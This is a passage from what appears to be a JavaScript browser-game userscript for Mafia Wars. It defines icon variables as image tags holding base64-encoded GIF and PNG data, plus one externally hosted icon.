    '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' +
    '" />';

var experienceIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOZyAAABAQBAUAARFQAFBgAUGQANEHvl/wMJCwBIWwBLXgAZIABLXQArNAUOED/Z/0Ta/wAbIgBDVAArNSnX/wB5lwBedUrb/xHQ/wB4lgYQEwA3RQTC8gCEpgCy3hPE8Ifm/wBgeBZ+lYbn/wAv' +
    'OyhSXAC/7wBfdwCPsyU6QFOSogAiKinU/wDG+ABbcgAGCCTT/wTO/wGbwkDZ/3nk/wDC8gMFBV/h/znY/wARFjHV/16Pmyx2iAAKDAAKDQBJWwAICgBmfxU4QAEDBEfK6gCiywA7SQBngRFEUQ3P/yXE6SE8QgB0' +
    'kgOjyy7X/xjR/yg7QB0uMhxCSxU9RxtvhAI6SA7Q/3nM4QBuigB6mRc4QAo3QQBiewA0QQKfx0nb/wB3lQUSFQBlfwGgyAONsAACAwCWvSk7QAAqNRrR/QTB8RvO+1Pc/wIJCwjQ/xrL+AA8SwidwgCFqAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHIALAAAAAAQABAAAAeagHKCg3INGYSIiCQ7iY1yKUNCjoQ1VhZUk4NQIl5jiWBRSihPZjozD25HWUFaRQQHUzI2Bh8GazkvTRMeXRUF' +
    'giNMajcOK05IG2UgKogFSywXVTAlJwg4jnBtNB1EWFyObElpcVcYFGE8jVJoHAEMPkZfGo0hMQECcgILQCYAiGRiEvQY9ONNCwiIJGxxkehMBH+DFAxwRGBiIAA7Cg==' +
    '" />';

var omgIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var pauseIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAMQAAAAAAP///4i1GpXCHJO/G5C9G4u4Goq2GpnGHZTBHI26G4eyGpzJHa3aIafVIKfUIKHOH5/NH6vYIaTSILPgIq7bIbLfIrHeIv3++f///wAAAAAAAAAAAAAAAAAAAAAAACH5BAEAABkALAAA' +
    'AAAQABAAAAVyYBZB0+NITVpdl0VRDDOWZ9qsLYXEs4mqLMtgJyP5bCtLYsgz1oCE5Q6DIVF/twJhMKSOqM+GQrukyqjHhmG8NTOoNJRhraVOq/HDgU7tYnoOenNsUk0lCwKChExFEwuIimSMI4+Qe4tEERmViZeS' +
    'OxkhADs=' +
    '" />';

var staminaIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/ANVbbJmZmkVHRikpKVV5Wq2fnux4itCxt8fIx76WnBYWFjU1NYyNjaVweJOSlNxqdysVF3t6fgcGBnR0daOhp76/vnZze7lcZOaMmq6Bh7KtrpN8hIJCSaCXmIGFi6qurmVjYm1jZGhpapOL' +
    'jHRoa1EpLnJvdt9KUeyQoZ+foLKJkeBpfE5QUO/w8FRJTOJTXpSVmudVZNHR0sdkb91wfICAgIR0d7t3g2VeZamnq7NWXPJugGRWXH9BR4BfXAAAACH5BAEAAD8ALAAAAAAQABAAAAaJwJ9wSCwaj0OJUFBTiByB' +
    'QIohWAxSFeEA8SFUWjJExOKBRSZCBYlAGBU6HQvFQclFhJtXiMVAaDQmA0UDADsJAiA8LjgBCkUJJzE+IgsiCgMTSkMDNAYABJcDCgQOmkI2KwYNggsCLI5FGQ8oKrCmRTcPGAe3Rw0XM7xIQyU9HDrDQxDLvcnO' +
    'QkEAOwo=' +
    '" />';

var updateBadIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var processIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADfElEQVR42nWSfUxTZxTGnwtjtIa2l5WFVhCqIwg4pWSyLbBkFcY2M8yYQiQmY200LPtjmTUxQSCsgKsxWVamTlziLDBhH7oxhlhmqWABt2UYhhIg' +
    'VvCGAa0tlUv1UqAfd29r5ka2nX/PeX7v8z7nUPifOlZv1G1/PuNDgSAK/f1DTZXV5Zr/mqMeC+rO00Lhk71UBM9yS5xGKhW1l79XrLzvXkJXl5mdmZneSKYNQqFAueTl3qqq1DJrAI0nf1jQHNhJ+/wB/GQaRFKy' +
    'DGlpKXA4FjHvdsJu/4PNzc2mJRIx2r66wM7OzWbVVFcwjwFnTn1/d1/Z64qhX+9Avj4WklgBxsZsWFn1ITk5Ac9s2oCIyMjwm+0dHWxpye7YNQ709V8YyjS7Dt6ddGJyykY6QSQkyhATsw4POQ/YRRYqlQrBQBCf' +
    'NTY21dVUhjOhTjVcNEjjROpA0EcXlxTA1G1FBBWBVGLf5XIgOjoK2zK3wely4behG8jPz0dnZyeWvN4+2+TUNaq1pZvfu+9VPPB44b7PYmDgF7zw4nZYrb3svNulDXmMj4837Fe/TV+9NoDUjGchEcUgKpJCU+vX' +
    'oC792M/nvpQNp9NDXrTDu8xBLFmHHotZW3XkcEPIZs3R4+qiwp3GUIDORS+SFAosr6yip8cCSl9/tkgkFhpycrMVQd4Pf2AFZJ3oMl3WVlU8AhypPabe8+YbRolYjLkFjoT5BKwDgyzDMJ+GQ9R/dPrgKwU5Brlc' +
    'jpujt5CXp0JrWxs7PWvX+khoclm84f1yDX3ZYkViSjrGJiZg7rFoz31c20DpjzYWbc1MbS8szCPB+DB4/TrZ/2ZsSJBheOQWgjzwnHIrZuz3cKnvZ+QVvAY/uRVTtwk3RkZ3EMBpdeGuHcb0LWmkESR7X4altw+0' +
    'RARFclIYEBJPMHPIeVkFithf9vkxcnMUV8xmTfgLn5/5cjgtPUVpu3ObzcxS0ukZW4jIgSlmGj5CkK1PhEQah2EiGr9tI0cmxej4OGOsO7TxUQb6EwoeAYTu29h8ni8t3QuWW4Gb9YQBghgRVom7tm8v4vihA9Se' +
    'D3Qqf5BnOk7W/n3Kf9VZYwtfXFIMxzyLc80tv0cLhPR+dZniHufDN9+145PD767R/AtQUa3TPRX39DsPOC/NejxZXj9Pp6Zs6p1beMjOOpzNF07U6/45/yfp9IvQT2YsKQAAAABJRU5ErkJggg==' +
    '" />';

var energyPackIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhGAAYAOZ/AFcqAO96APLpzPXHMv3012g2AIZRAvniksS3nue6RHZCAPvoqfjXa9KdAO9pAPO+EbCJKePXw51oAbGVZS8oD2FbR/767NurF/bSXe+UAPPELdOsQ++HANC/q62PTQwIAufEV3JbErF8AOW9' +
    'N49hIfTBG/bZeNvEiubTl/TEJvzsu/DLUtW9cKVyAaJ3MLiEAtq5VfXcjcZ4MbyJAOKtAdmlAO65Dd2oAPn4+PXLP/K/FSUUAO2+ItaiAPLu6+u2CXRoP+PJeOfJZvzwysqVAO/JS6NuBEUdAP745v39/f778LWA' +
    'AOvm4at2APDFQfG8EOaxBMSRAPXy8O9fAKRyDjcyIbSBC////++kALOEGtvMt+izBuK2MOXbt+3iyZ5uG/n39t+tDPHPX+3ALfCjDLOlduvGTcCNAPbhnMueD1hKHd3AZNVNAMKFI+OyD++6AOXPhr+njN3SybiG' +
    'DO/IAI1gAP734fC+Gs+gH6J8AO+sAOPATevSf+Pa0uG0IQAAACH5BAEAAH8ALAAAAAAYABgAAAf/gH+Cg38fVUBlKHATQFUfhJCDHxURFkqXFkgEC2tqj5GCFAgWFpsYAzkmC0NDBxAUoFUCSUMrbjc9uTU1F2so' +
    'fH6whBQCSjE8NTNNEszNLTMsQls7kghKB3c3SxFX3d7eJ0FOeZ8VBAQDP0Qu3Q5T71NsOBEvCSZpAIVdFgw6NEtxrshwQPAdDikkXoQxwaWFITsEcthoIEFKkgABHGTEkeSIgRc3VpgRsQOInQUpoMyYkEQGB4wB' +
    'uiWZ6aXHGDEiAHiwYOJJjRZyrmTgQPQlxita5tS4w2BJgT0WMEyEcKVNhqtDiV5BYIQIFB0YRCgYYYfBxBNXcKhNgPVKHCMN7KA8KVHESAEIBA7woEFEQoEkOLBgIZNkQpMGW57oSMGlzpEQKlSkuyH2ihM9V8B4' +
    'ENHjx5MHDzRcMLCDAgMVGPy96MDkzRUfLqx0/vyghAYrBT58SHMATYobTXzQucLExYwbnkE/SDEawCMAI9BgAN6tz5czN2zQrs2jBQBqhepsiJHgTJIIVKLQ0A5aRwkeuI98+rOjxYYgMNJEabD+gfsSKcBXgHOQ' +
    '7FBHFjAIAYITGqSQwgADiGYEAARGskMBBkCwAQhiiFEEF3hQoQAA8oEiyAc7AFCAAga0OCCFO8xnYiEoHkHhETHKOEggADsK' +
    '" />';

var energyIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AEs+IPfHHj0zIPesHveqHmhPIPfCHvfAHi8uIfexHve4HktEIPe9HvfEHve7HveoHvfFHiAiIWhZIPeuHiAgIS8wIdqfHqGBH/fWHvfiHve6HlpWIMyYH/fJHve3HsyXH+nGHr6SH/fbHj05' +
    'IOmfHoV0H/ezHlpEIFpPIK+hH/fMHve0Hsy0H9q0HmhUIKGSH6GWH/fKHvfUHvevHtqqHve5HvfPHvepHvfIHve+Hve2HoV9Hz0xIGhYIEs9IP///yH5BAEAAD8ALAAAAAANAA0AAAZgwJ+wMCDcHg8ST8i0JGaT' +
    '4okpdCl0K1OiQBXSGA6NggMA+ATCXsNwOIBrng/61+oEIOtDLkRhLhYoMTh3F11CJTY2KhKGPwgYMiAjjT8vIiwIlBUZKRGUPzA7n0Iboz9BADs=' +
    '" />';

var killedMobsterIcon = '<img src="http://playerscripts.com/images/mwap_graphics/icon_killed.png" />';

var yeahIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+ro' +
    'KUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63' +
    'otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSO' +
    'ixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQr' +
    'zSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC' +
    '" />';

var plussignIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQALMPAO3r6wxTAGmvZqjQppHFj4O8gANoAACCAJ3JmkqiRzCXLQB3ABGOEl6pWv38/P///yH5BAEAAA8ALAAAAAAQABAAAART8MlJqwUuO2CpG0ghON30hQ1ZPmeRqBSmDYTwahxbEDxRNIyDcKFy' +
    'CI7HBGPBNBiKiigjuHAaAoGi8NDEerMSWcaJ1Wwsjmt5xfrCOg43W3xmsyMAOwo=' +
    '" />';

var cashIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAAkAAAANCAYAAAB7AEQGAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjVJivzg' +
    'AAABA0lEQVQoU3XRwUcEURzA8adDhw7xdNpLh6dbp0SX6L+IDp06jG7deqeu6RBLrBppicSOjkk8koqkIYq9zaGVPZSmJUUxfn3fM7LbaPh4v/nOY+YZpfqulswlyPvb73zwPathkd8Xe5IVJ2mnuHC+hU3N9xmN' +
    'FHL3tVtBt2r7ecpCbj92AmYDjdjfP3y2MlV/nHSQ614jYLYw/i3lHKn19kQMuXzZGnDz2uzS58M3raXjBjnkrFuvaL+dOrV6VZuGgYO4zuaA86dGrlbcmCAcldVgo2y+B2r5eDSFIPIbWTWysvmeqKWjEQv5R0YP' +
    'J1WLh8MRYuQQJLDQlV+0sD+UQP4++AGT2OU9X81LRgAAAABJRU5ErkJggg==' +
    '" />';

var cashCubaIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/AMa6tRRvU+Tc1N/X0BX1ALlpih0XF+3i3szDuvHP4Qv1AVclM3BsbCu1J+q50xjVBcaAoMpsmFmYY+LSzO3j2bt1ptqKtXQzUtPGu9rMxLKkm/Pm49Z3qcJcjY1ebrQ7cChYKrtTf85soFWY' +
    'VzCLOguNMMm2q2pTVMCbk1FKSqhEaOWoyALeCJtFXWaHZxzsA9jGwtRvpdLCwdLKxqtidtC0rgTKBYx5euDOyrNce9e/upiYmJI0TuTV0evh2P///yH5BAEAAD8ALAAAAAAQABAAAAaKwJ9wSCwaj8hk0cDzeAzK' +
    'xWeViBQuAZCx9bEkOJBdIKCQLBZDUw0SKkjGrFEl0r6cEIOMhvQo2VwVXg4xNBkYAwMIDQoEDCoiDg4cBT0DAAICigQKABgoOR0dOBszPwwAAA0EBDKYAzoTGwcpRCAPLzA+uj4HBzdHBhoCPhQUBwBKpgg+E1DJ' +
    'z0pBADs=' +
    '" />';

var cashMoscowIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU6ACkFBt4aIvFCSdoaIaITGV8LDvNhZq8VG/mtsPbbAChtEekbI8AXHfFITvvIyu8oL/JRV7kWHNwaIfXkAca/E/AwOOcbI8fFJvA4P5iiGfJNU/A0O/NZX/aBhX0PE/V2e9W8Be8tNPFGTL0W' +
    'HcrDBPLPAPNbYeAaIt7bAoMPFIgQFeQbIveanUV5E/JYXmJbD7MVG+zMA22NC9XDD+8kLM0YH4EPE5IRFvA5QJ6rQQAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADoALAAAAAAQABAAAAaMQJ1wSCwaj8hkERAZDABK' +
    'T4Dl0GwIKZsxEvg4DKaGQjFZeQpDQmBDw+RaCtSloQmJbgUGg0DIgGQkc14ILhEETgMMFBMJGRIQCAgGEg8nBwsLNRQJEwcjARIYAQEdBzoABTAzJQkWFRUDAQ8dBlBDLyAxDwK8AgYcaEYAKgsCEBAcFkqnBwI4' +
    'tsvRSUEAOw==' +
    '" />';

var cashBangkokIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/ACIGBdl/RV8bFUkOCooZGJtNGsBfIKo4IPvmrcpkE3PNKZUcHZk9D/SJILlGIyBeN9p5Efnah3nNKMpoNGOoMO+USb0/HfKhHtE0G/a9NvS2ImusQO9/HOSPUvGSGu+JRfKyZG6zJ0uLL3AW' +
    'CmC6Jn3KJ3vGKYEbBe+GGYYaG/CJIFypJPOoHvOdJKEpH7k2HTZUHCNoLPSyH5QXDCx3IG60L/SCEfjRapNNILkpC2WZUu6EFtF0LXcSFHYyGgAAACH5BAEAAD8ALAAAAAAQABAAAAaMwJ9wSCwaj8hkEcDAYADK' +
    'EeSGuHByp5mRAckgNK3G46GwjQZDQYGz8+hiD9KmcUGpZoPFQiAQhWgrc14RMgwCB4gLFAoSIgksEREaCQYvBA4OLhQSCgQ+BQkeEAUgBD8AAyk1JRIWExM4BQYgFVBDMCEmBgG8ARUfaEYAPQ4BHR0fFkqnBAE8' +
    'tsvRSUEAOw==' +
    '" />';

var cashVegasIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjVJivzg' +
    'AAADXklEQVQ4T32TD0zUdRjGv3Ac4N3ujuOPHBweh4eAwCGCwCk1PeQQvI4QEGhB624QFoIDtQzbNO20urRZQEyBjWWsXPZH0k7K4Qbl1hS0stI27I8sMMOO0FVin36zrc3F+m7vvtv7vnve9332PELM8U4csRef' +
    'H3r4vZtX6y7P+urH1ttTTquD1ZuUwXLlXP3/5jISlqbsd6//DPbx5VP5THQ8yC12U+5YxhLTIu7LMI7v3mYsmxOkqqigqPGhmtkKRzGT40188WENRz1rOevJY/tjOdjsaRw95gBcvN0bvesekLX2+JTDnbW3V+VY' +
    'adhSwvG6XIbd+Xz8loOfOrIZeHUFvc4Ufr1Yyuc9Vg6XaGg/oKi9C5K5RBs98FH1+7CDod4H6Gsu5OsTJXBrnTStWopKuJPHneFk3OsSaduZxeSpHKauZ004y0WkePfN4qf7nTmMdhQw0l7I2KH72deTT2mpiTK7' +
    'iQ3ORGxWA7s8iVz4YCGHyqLwTVrZszOV2KiAJnH7l3rv1ICDkwdsvLQxG6ZWUFGVStpSM8mJJuIMRhboYojRG+CajiH3fNZkRCALDCMoQDUovhmtHJ6WiDnXbeNMY6y0shnbSgP2PCM1JQsoWp1AS2006elGmEng' +
    'wjs6qrJDCdeEI4R6QqTELhrOTE7AVZjOqVeSJIAYVlp0LDfrKC+IwGox4CyNwGTSw/VQzruD6HtEwY1pHf3dQRNCpzF45bJYLOmJHGmIg+kQsrLmkxyrZ40ljMykSPIyVQT4R8IVPzwuBXsbtfw8ouDsoP9pYY4P' +
    '315bGc+V7y280bCQQY+aznYVWx/V4tmk5plaDc83KXmyWcXFLhndTyjwdql52SZoqRPNomVrlP7SpcX9M6OL6XpBYn2Vnu+6g+G3QPhd+v8MAF8A48flbFut5GCrUjpTyY0x/2u5ZqG7q4XWF+NTex5XzbZVa7j5' +
    'o4n9di0H60P4pElO32YFHc55PGcJwlWhRakOp8Shwt0qNtyjRt9EkqTT0L+83mjS0qJw5EbwukvFa5tD6HxWw8yYkmUZoRLzIcj8AvfO6Qd8cWkZZvWIEFoUsjDGfgjnq2PzaF3uJ60dyJ4dEutCXvW/jvynGFyu' +
    '0ypOXv1UdvmPEfHtuV5xxtsmtmysFP+x8999db7DTUMcSAAAAABJRU5ErkJggg==' +
    '" />';

var healthIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH1wUIFAADTJ17vgAAAJlJREFUOMvFk7ERwjAMRb84L2ENkhmgyh5p' +
    'WYAFmIExoPQUHiDF9xiiCkeMgu+cIr+z/P30ZZ8FG3rdL/a9Pl+f4vlCSgk5ZwzD9Cmq0h63cWUkaaoqLgAA5nllBwCpAV4C+bfZUoxRQNJ6RdLCJl6qcc0PecJOhWbnul4l2Z3geMDvHSwzHvcKjY4eQEop1hlA' +
    'lr/QdVpV8QYMB23AfeHdZQAAAABJRU5ErkJggg==' +
    '" />';

var healOnIcon = '<img src="data:image/png;base64,' +
